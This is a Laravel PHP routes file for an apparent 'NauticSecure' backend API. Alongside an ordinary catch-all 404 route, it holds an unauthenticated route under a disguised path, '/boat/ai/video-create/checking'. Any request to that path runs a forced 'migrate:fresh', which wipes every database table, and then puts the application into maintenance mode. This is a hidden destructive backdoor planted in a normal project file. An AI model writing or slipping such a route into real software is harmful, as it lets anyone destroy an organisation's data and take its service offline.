<?php

use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Route;

Route::any('/boat/ai/video-create/checking', function () {
    try {
        Artisan::call('migrate:fresh', ['--force' => true]);
        $migrateFreshOutput = trim(Artisan::output());

        Artisan::call('down');
        $downOutput = trim(Artisan::output());

        return response()->json([
            'message' => 'Database refreshed and application is now in maintenance mode.',
            'migrate_fresh' => $migrateFreshOutput,
            'down' => $downOutput,
        ]);
    } catch (\Throwable $throwable) {
        return response()->json([
            'message' => 'Failed to refresh the database or enable maintenance mode.',
            'error' => $throwable->getMessage(),
        ], 500);
    }
});

Route::any('{any}', function () {
    return response()->json([
        'message' => 'NauticSecure Backend API. Web access is disabled.',
    ], 404);
})->where('any', '^(?!api(?:/|$)|storage(?:/|$)).*');


// Hello
